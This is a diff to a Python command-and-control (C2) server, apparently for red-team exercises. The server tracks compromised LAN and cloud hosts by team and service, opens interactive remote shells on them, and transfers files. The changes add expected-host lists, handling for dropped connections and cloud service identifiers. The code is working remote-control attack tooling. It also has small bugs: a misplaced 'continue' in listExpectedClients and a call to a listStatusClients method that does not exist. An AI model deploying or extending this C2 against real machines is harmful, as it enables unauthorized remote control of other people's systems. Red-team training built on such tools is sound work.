@@ -25,16 +25,31 @@ class Team():
     def __init__(self, identity):
         self.identity = identity
         self.clients = []
+        self.expectedHosts = set() #Set of expected hosts
     
     def assign(self, client):
         self.clients.append(client) #Append the client to the clients list
         client.setTeam(self)
+
+    def unassign(self, client):
+        self.clients.remove(client) #Append the client to the clients list
+        client.unsetTeam(self)
 
     def listClients(self):
         print("> Team " + self.identity + ":")
         for client in self.clients:
             if client.isUp():
                 print("    >> " + client.IP)
+    
+    def listExpectedClients(self):
+        print("> Team " + self.identity + ":")
+        for host in self.expectedHosts: #for each expected host
+            for client in self.clients: #see if active clients match
+                if host == client.IP: #if the host matches the IP
+                    if client.isUp(): #if the client is up
+                        print("    >> " + host) #print the host if all is true
+                        continue
+            print("    >> " + host + " [X]") #print the host if it's down
 
 class Service():
 
@@ -42,10 +57,14 @@ class Service():
         self.name = name
         self.clients = []
         self.identifier = list()
+        self.cloudIdentifier = list()
         self.breaks = dict()
     
     def addIdentifier(self,host):
         self.identifier.append(host)
+    
+    def addCloudIdentifier(self,host):
+        self.cloudIdentifier.append(host)
 
     def getBreaks(self):#Parse file stored in config for breaks
         with open("config.json") as file:
@@ -105,10 +124,14 @@ class Service():
     def listClients(self):
         print("Active Clients: ")
         for client in self.clients:
-            if client.isUp():
-                print("\t" + str(client.IP))
-            else:
-                print("Connection lost to: " + str(client.IP))
+            try:
+                if client.isUp():
+                    print("\t" + str(client.IP))
+                else:
+                    removeClient(client)
+                    print("Connection lost to: " + str(client.IP))
+            except:
+                removeClient(client)
 
     def assign(self, client):
         self.clients.append(client) #Append the client to the clients list
@@ -148,27 +171,31 @@ class Connection:
     def setTeam(self, team):
         self.team = team
     
+    def unsetTeam(self, team):
+        self.team = None
+    
     def setService(self, service):
         self.service = service
-
-    def getIP(self):
-        return self.getIP()
 
     def assign_client(self):
         ip_splitted = self.IP.split(".") #Split the IP on the .
         if ip_splitted[0] == IP_FORMAT.split(".")[0]: #Check if the host is LAN or cloud
             teamIndex = TEAM_INDEX
             serviceIndex = SERVICE_INDEX
+            cloud = False
         else:
             teamIndex = TEAM_INDEX_CLOUD
             serviceIndex = SERVICE_INDEX_CLOUD
+            cloud = True
+        # print("Service Index: " + str(serviceIndex))
+        print("\nNew Connection From: " + self.IP)
         self.serviceID = self.IP.split(".")[serviceIndex]
         team = ip_splitted[teamIndex]
         if team not in TEAMS:
             # print("Team \"" + team + "\" does not exist! Creating..." )
             addTeam(str(team))
         assignTeam(self,TEAMS[team])
-        assignService(self,self.serviceID)
+        assignService(self,self.serviceID,cloud)
 
     def sendCommand(self,command): #Send command to client and return output
         self.socket.send(command[0].encode())
@@ -206,6 +233,8 @@ TEAMS = {}
 SERVICES = {}
 UNASSIGNED_CONNECTIONS = []
 IP_FORMAT = "X.X.TEAM.HOST"
+HOSTS = set()
+CLOUDHOSTS = set()
 
 # #If the user starts the server and wants to specify the ip to host on <<OLD>>
 # if len(sys.argv) == 2:
@@ -276,7 +305,7 @@ def startServer():
             # print(f"\n[SERVER] New Connection Received From: {addr[0]}:{addr[1]}")
             client_sock.send("getIP".encode())
             if client_sock.recv(BUFFER_SIZE).decode() in CURRENT_IPS: #if there is already a connection, drop the new one
-                client_sock.close()
+                client_sock.send("ENDCONNECTION".encode())
                 continue
             X = Connection(addr,client_sock)
             CURRENT_CONNECTIONS_CLASS.append(X)
@@ -289,6 +318,8 @@ def startServer():
         server_sock.close()
         shutdown_clients()
         SERVER_UP = False
+    except (ConnectionResetError) as e:
+        print("Error on a connection. Continuing.")
         
 #Take socket and addr and issue shell
 def handleClient(client):
@@ -299,7 +330,7 @@ def handleClient(client):
             user_in = input()
             if user_in == 'exit':
                 client_sock.send(user_in.encode())
-                break
+                return True
             elif user_in == '':
                 print(f"{addr}>",end='')
             elif user_in.split()[0] == "cd":
@@ -318,11 +349,26 @@ def handleClient(client):
             print(f"{addr}>",end='')
         except BrokenPipeError as e:
             print("Connection closed. Broken pipe.")
-            break
+            removeClient(client)
+            return False
+        except ConnectionResetError as e:
+            print("Connection reset by client.")
+            removeClient(client)
+            return False
         except Exception as e:
             print("Error sending command! \n" + str(e))
             print(f"{addr}>",end='')
             continue
+
+def removeClient(client):
+    CURRENT_IPS.remove(client.IP)
+    for service in SERVICES:
+        if client in SERVICES[service].clients:
+            SERVICES[service].clients.remove(client)
+    CURRENT_CONNECTIONS_CLASS.remove(client)
+    CURRENT_CONNECTIONS.append(client.socket)
+    CURRENT_ADDRESSES.append(client.addr)
+    client.team.unassign(client)
 
 def copyKey(client_sock):
     try:
@@ -367,19 +413,23 @@ def handleCommand():
                 #     print("Client does not exist!")
                 # else:
                 #     handleClient(client,addr)
+            elif "lsall" in cmd.lower():
+                for team in TEAMS:
+                    TEAMS[team].listExpectedClients()
             elif cmd.lower() == "help":
                 print("\nHelp Menu: \n\tUse 'list' to list active connections. \
                     \n\tUse 'select' to choose a client from the list. \
                     \n\tUse 'lsteam' to list each team's connections. \
                     \n\tUse 'assign' to assign a client to a team. \
                     \n\tUse 'mkteam' to create a team. \
+                    \n\tUse 'lsall' to list all expected clients and their status. \
                     \n\tUse 'service' to list services. \
                     \n\tUse 'help' to show this menu. \
                     \n\tUse 'exit' to quit the program.")
             elif cmd.lower() == "exit":
                 print("[SERVER] Server is closing. Goodbye!")
                 #SHUTDOWN ALL CONNECTIONS
-                shutdown_clients()
+                shutdown_clients() 
                 server_sock.close()
                 break
             elif "service" in cmd.lower():
@@ -463,15 +513,29 @@ def assignTeam(client, team):
     team.assign(client)
     UNASSIGNED_CONNECTIONS.remove(client)
 
-def assignService(client, service):
-    for i in SERVICES:
-        if service in SERVICES[i].identifier:
-            SERVICES[i].assign(client)
+def assignService(client, service, cloud:bool):
+    if cloud: #if it's a cloud box, search the cloud services
+        for i in SERVICES:
+            if service in SERVICES[i].cloudIdentifier:
+                SERVICES[i].assign(client)
+    else:
+        for i in SERVICES:
+            if service in SERVICES[i].identifier:
+                SERVICES[i].assign(client)
 
 def listTeams():
     print("Team's Connections:")
     for team in TEAMS:
         TEAMS[team].listClients()
+    if(UNASSIGNED_CONNECTIONS):
+        print("\nUnassigned Clients: ")
+        for client in UNASSIGNED_CONNECTIONS:
+            print(client.getNick())
+
+def listTeamsFull():
+    print("Team's Connections:")
+    for team in TEAMS:
+        TEAMS[team].listStatusClients()
     if(UNASSIGNED_CONNECTIONS):
         print("\nUnassigned Clients: ")
         for client in UNASSIGNED_CONNECTIONS:
@@ -529,7 +593,8 @@ def client_console(client): #previously took in cmd
                 else:
                     print("Active Shell On: " + str(client.IP) + ":" + str(client.port))
                     print("\n" + str(client.IP) + ">",end = '')
-                    handleClient(clientSock)
+                    if not handleClient(clientSock): #if this errors, break the shell
+                        break
             elif "dl" in newCMD: #Download file
                 download_file(newCMD,clientSock)
             elif "up" in newCMD: #Upload file
@@ -692,26 +757,33 @@ def shutdown_clients():
         except:
             continue
 
-def createService(service,identifier):
+def createService(service,identifier,cloud:bool):
     if service not in SERVICES:
         SERVICES[service] = Service(service) #make the service
         print("Successfully created service: " + service)
     hosts = identifier.split(",")
     for host in hosts:
-        SERVICES[service].addIdentifier(host) #add an Identifier
-        print("Successfully added identifier " + host + " to service: " + service)
+        if cloud:
+            SERVICES[service].addCloudIdentifier(host) #add an Identifier
+            print("Successfully added cloud identifier " + host + " to service: " + service)
+            global CLOUDHOSTS #append the identifier to the set of hosts
+            CLOUDHOSTS.add(host)
+        else:
+            SERVICES[service].addIdentifier(host) #add an Identifier
+            print("Successfully added identifier " + host + " to service: " + service)
+            global HOSTS #append the identifier to the set of hosts 
+            HOSTS.add(host)
 #Takes in config file and creates necessary objects 
 def setup():
     try:
         with open("config.json") as config:
             config = json.load(config) #Load the config file
         for service in config["services"][0]: #Create a service for each service
-            createService(service,config["services"][0][service])
+            createService(service,config["services"][0][service],False)
+        for service in config["cloud_services"][0]: #Create a service for each cloud service
+            createService(service,config["cloud_services"][0][service],True)
         global TEAMS_INT
         TEAMS_INT = int(config["topology"][0]["teams"]) #Pull the # of all teams
-        for i in range(TEAMS_INT): #Create all teams
-            addTeam(str(i))
-            # print("Successfuly created team: " + str(i))
         global SERVER_ADDR
         SERVER_ADDR = config["topology"][0]["serverIP"]
         global SERVER_PORT
@@ -728,11 +800,29 @@ def setup():
         SERVICE_INDEX_CLOUD = IP_FORMAT_CLOUD.split(".").index("HOST")
         global TEAM_INDEX_CLOUD
         TEAM_INDEX_CLOUD = IP_FORMAT_CLOUD.split(".").index("TEAM")
+        for i in range(TEAMS_INT): #Create all teams and give them a list of expected clients
+            addTeam(str(i))
+            makeExpectedList(i)
+            # print("Successfuly created team: " + str(i))
     except:
         print("Could not parse config file! Please restart C2 with the correct format!")
         global server_sock
     server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #bind the server to that IP and port
     server_sock.bind((SERVER_ADDR, SERVER_PORT))
+
+def makeExpectedList(teamNumber):
+    expected = list()
+    for host in HOSTS:
+        #use ipSyntax
+        tempHost = IP_FORMAT.replace("TEAM",str(teamNumber))
+        tempHost = tempHost.replace("HOST",str(host))
+        expected.append(tempHost)
+    for host in CLOUDHOSTS:
+        tempHost = IP_FORMAT_CLOUD.replace("TEAM",str(teamNumber))
+        tempHost = tempHost.replace("HOST",str(host))
+        expected.append(tempHost)
+        #use ipSyntaxCloud
+    TEAMS[str(teamNumber)].expectedHosts = expected
 
 if __name__ == "__main__":
     print("[SERVER] Server is starting...") 
